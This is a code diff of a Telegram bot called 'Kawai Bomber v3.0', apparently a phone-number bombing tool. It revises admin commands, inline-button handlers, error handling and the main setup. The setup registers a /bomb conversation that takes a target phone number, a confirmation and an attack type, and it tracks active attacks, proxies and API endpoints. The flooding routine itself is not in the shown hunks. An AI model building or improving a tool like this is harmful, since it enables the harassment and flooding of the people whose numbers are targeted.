@@ -1037,7 +1311,9 @@ async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /unban <user_id>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /unban <user_id>"
+        )
         return
     
     try:
@@ -1045,36 +1321,45 @@ async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if unban_id in BANNED_USERS:
             BANNED_USERS.remove(unban_id)
             await update.message.reply_text(
-                f"{EMOJIS['unban']} Unbanned user {unban_id}!"
+                f"{EMOJIS['unban']} <b>User unbanned successfully!</b>\n\n"
+                f"User {unban_id} can now use the bot again.",
+                parse_mode=ParseMode.HTML
             )
         else:
-            await update.message.reply_text(f"{EMOJIS['warning']} User not banned!")
-    except:
-        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")
+            await update.message.reply_text(
+                f"{EMOJIS['warning']} User was not banned!"
+            )
+    except ValueError:
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Invalid user ID format!"
+        )
 
 async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Broadcast message"""
+    """Broadcast message to all users"""
     user_id = update.effective_user.id
     
     if user_id not in ADMIN_IDS:
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /broadcast <message>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /broadcast <message>"
+        )
         return
     
     message = " ".join(context.args)
     
-    # In production, broadcast to all users
+    # In production, you would iterate through all users
+    # For now, we'll just show a confirmation
     await update.message.reply_text(
-        f"{EMOJIS['broadcast']} <b>Broadcast prepared!</b>\n\n"
+        f"{EMOJIS['broadcast']} <b>BROADCAST PREPARED</b>\n\n"
         f"Message: {message}\n\n"
-        f"Would be sent to {len(USER_DB)} users.",
+        f"Would be sent to {len(USER_DATABASE)} users.",
         parse_mode=ParseMode.HTML
     )
 
 async def sysinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """System info"""
+    """Display system information"""
     user_id = update.effective_user.id
     
     if user_id not in ADMIN_IDS:
@@ -1083,61 +1368,70 @@ async def sysinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     import platform
     import psutil
     
-    cpu = psutil.cpu_percent()
+    # Get system info
+    cpu_usage = psutil.cpu_percent()
     memory = psutil.virtual_memory()
+    disk = psutil.disk_usage('/')
     
-    sysinfo_text = f"""
+    sysinfo_message = f"""
 {EMOJIS['server']} <b>SYSTEM INFORMATION</b> {EMOJIS['server']}
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['cpu']} <b>CPU Usage:</b> {cpu}%
-{EMOJIS['memory']} <b>Memory:</b> {memory.percent}%
-{EMOJIS['os']} <b>OS:</b> {platform.system()}
-{EMOJIS['python']} <b>Python:</b> {platform.python_version()}
+{EMOJIS['cpu']} <b>CPU USAGE:</b> {cpu_usage}%
+{EMOJIS['memory']} <b>MEMORY:</b> {memory.percent}% ({memory.used//1024//1024}MB/{memory.total//1024//1024}MB)
+{EMOJIS['disk']} <b>DISK:</b> {disk.percent}% ({disk.used//1024//1024}MB/{disk.total//1024//1024}MB)
 
-{EMOJIS['bot']} <b>Bot Info:</b>
-├─ {EMOJIS['users']} <b>Users:</b> {len(USER_DB)}
-├─ {EMOJIS['active']} <b>Active:</b> {len(active_bombs)}
-├─ {EMOJIS['proxies']} <b>Proxies:</b> {len(PROXY_LIST)}
-└─ {EMOJIS['apis']} <b>APIs:</b> {len(APIS)}
+{EMOJIS['os']} <b>OPERATING SYSTEM:</b> {platform.system()} {platform.release()}
+{EMOJIS['python']} <b>PYTHON VERSION:</b> {platform.python_version()}
+
+{EMOJIS['bot']} <b>BOT INFORMATION</b>
+├─ {EMOJIS['users']} <b>USERS:</b> {len(USER_DATABASE)}
+├─ {EMOJIS['active']} <b>ACTIVE:</b> {len(active_attacks)}
+├─ {EMOJIS['proxies']} <b>PROXIES:</b> {proxy_manager.get_proxy_count()}
+└─ {EMOJIS['apis']} <b>APIS:</b> {len(API_ENDPOINTS)}
+
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+{EMOJIS['time']} <i>Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
 """
     
     await update.message.reply_text(
-        sysinfo_text,
+        sysinfo_message,
         parse_mode=ParseMode.HTML
     )
 
 # ==================== BUTTON HANDLERS ====================
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle button callbacks"""
+async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle inline button callbacks"""
     query = update.callback_query
     await query.answer()
     
     data = query.data
     user_id = update.effective_user.id
     
-    if data == "start_bomb":
+    if data == "start_bombing":
         await bomb_command(update, context)
     elif data == "show_stats":
         await status_command(update, context)
-    elif data == "help_menu":
+    elif data == "show_help":
         await help_command(update, context)
-    elif data == "admin_panel":
+    elif data == "user_settings":
+        await mystats_command(update, context)
+    elif data == "admin_dashboard":
         if user_id in ADMIN_IDS:
             await admin_command(update, context)
         else:
             await query.answer("Access denied!", show_alert=True)
-    elif data == "settings":
-        # Simple settings response
+    elif data == "confirm_attack":
+        await handle_confirmation(update, context)
+    elif data == "cancel_attack":
         await query.edit_message_text(
-            f"{EMOJIS['settings']} <b>Settings</b>\n\n"
-            f"Premium: {'Yes' if user_id in APPROVED_USERS else 'No'}\n"
-            f"Admin: {'Yes' if user_id in ADMIN_IDS else 'No'}\n"
-            f"Status: {'Active' if user_id not in BANNED_USERS else 'Banned'}",
+            f"{EMOJIS['success']} <b>Operation cancelled!</b>",
             parse_mode=ParseMode.HTML
         )
+        return ConversationHandler.END
 
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cancel conversation"""
+async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Cancel ongoing conversation"""
     await update.message.reply_text(
         f"{EMOJIS['success']} <b>Operation cancelled!</b>",
         parse_mode=ParseMode.HTML
@@ -1146,37 +1440,45 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ==================== ERROR HANDLER ====================
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle errors"""
+    """Handle bot errors"""
     try:
         raise context.error
-    except InvalidToken:
-        print(f"\n{EMOJIS['error']} ERROR: Invalid bot token!")
-        print(f"Please check your BOT_TOKEN in Railway variables.")
-        print(f"Current token: {BOT_TOKEN[:10]}...")
     except Exception as e:
-        print(f"\n{EMOJIS['error']} ERROR: {e}")
+        print(f"\n{EMOJIS['error']} ERROR: {str(e)}")
+        if update and update.effective_message:
+            await update.effective_message.reply_text(
+                f"{EMOJIS['error']} <b>An error occurred!</b>\n"
+                f"Please try again later.",
+                parse_mode=ParseMode.HTML
+            )
 
 # ==================== MAIN FUNCTION ====================
 def main():
     """Start the bot"""
     print(BANNER)
-    print(f"{EMOJIS['sparkles']} Kawai Bomber")
+    print(f"{EMOJIS['sparkles']} Kawai Bomber v3.0")
     print(f"{EMOJIS['heart']} Made by @zerocyph")
     print(f"{EMOJIS['power']} Powered by Python-Telegram-Bot")
     print(f"{EMOJIS['warning']} Starting bot...")
     
-    # Create Application
+    # Validate token
+    if not BOT_TOKEN or len(BOT_TOKEN) < 20:
+        print(f"\n{EMOJIS['error']} ERROR: Invalid bot token!")
+        print(f"Please set BOT_TOKEN environment variable.")
+        sys.exit(1)
+    
+    # Create application
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Add conversation handler
-    conv_handler = ConversationHandler(
+    # Create conversation handler for bombing
+    conversation_handler = ConversationHandler(
         entry_points=[CommandHandler("bomb", bomb_command)],
         states={
-            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
-            CONFIRM: [CallbackQueryHandler(handle_confirm, pattern="^confirm_")],
-            BOMB_TYPE: [CallbackQueryHandler(handle_bomb_type, pattern="^type_")]
+            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_input)],
+            CONFIRM: [CallbackQueryHandler(handle_confirmation, pattern="^(confirm_attack|cancel_attack)$")],
+            BOMB_TYPE: [CallbackQueryHandler(handle_attack_type, pattern="^attack_")]
         },
-        fallbacks=[CommandHandler("cancel", cancel_command)]
+        fallbacks=[CommandHandler("cancel", cancel_conversation)]
     )
     
     # Add command handlers
@@ -1186,7 +1488,7 @@ def main():
     application.add_handler(CommandHandler("mystats", mystats_command))
     application.add_handler(CommandHandler("help", help_command))
     
-    # Admin commands
+    # Add admin command handlers
     application.add_handler(CommandHandler("admin", admin_command))
     application.add_handler(CommandHandler("addadmin", addadmin_command))
     application.add_handler(CommandHandler("removeadmin", removeadmin_command))
@@ -1198,15 +1500,15 @@ def main():
     application.add_handler(CommandHandler("sysinfo", sysinfo_command))
     
     # Add conversation handler
-    application.add_handler(conv_handler)
+    application.add_handler(conversation_handler)
     
     # Add callback query handler
-    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(CallbackQueryHandler(button_callback_handler))
     
     # Add error handler
     application.add_error_handler(error_handler)
     
-    # Start the bot
+    # Start bot
     print(f"\n{EMOJIS['rocket']} Bot is running...")
     print(f"{EMOJIS['star']} Press Ctrl+C to stop")
     
@@ -1215,13 +1517,11 @@ def main():
             allowed_updates=Update.ALL_TYPES,
             drop_pending_updates=True
         )
-    except InvalidToken as e:
-        print(f"\n{EMOJIS['error']} FATAL ERROR: Invalid bot token!")
-        print(f"Please check your BOT_TOKEN environment variable.")
-        print(f"Token used: {BOT_TOKEN[:10]}...")
-        sys.exit(1)
+    except KeyboardInterrupt:
+        print(f"\n{EMOJIS['success']} Bot stopped by user.")
+        sys.exit(0)
     except Exception as e:
-        print(f"\n{EMOJIS['error']} FATAL ERROR: {e}")
+        print(f"\n{EMOJIS['error']} FATAL ERROR: {str(e)}")
         sys.exit(1)
 
 if __name__ == "__main__":
